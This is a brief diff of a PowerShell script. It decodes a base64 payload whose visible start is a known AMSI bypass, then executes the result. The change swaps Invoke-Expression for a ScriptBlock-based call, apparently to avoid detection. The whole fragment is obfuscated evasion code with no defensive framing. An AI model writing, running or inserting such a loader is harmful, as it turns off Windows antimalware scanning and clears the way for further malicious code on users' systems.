@@ -3,4 +3,5 @@ W1JlZl0uQXNzZW1ibHkuR2V0VHlwZSgic3lzdGVtLm1hbmFnZW1lbnQuYXV0b21hdGlvbi5hbXNpVXRp
 "@ -replace "`r|`n", ""
 
 $decoded = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($b64))
-Invoke-Expression $decoded
+
+Invoke-Command -ScriptBlock ([ScriptBlock]::Create($decoded))
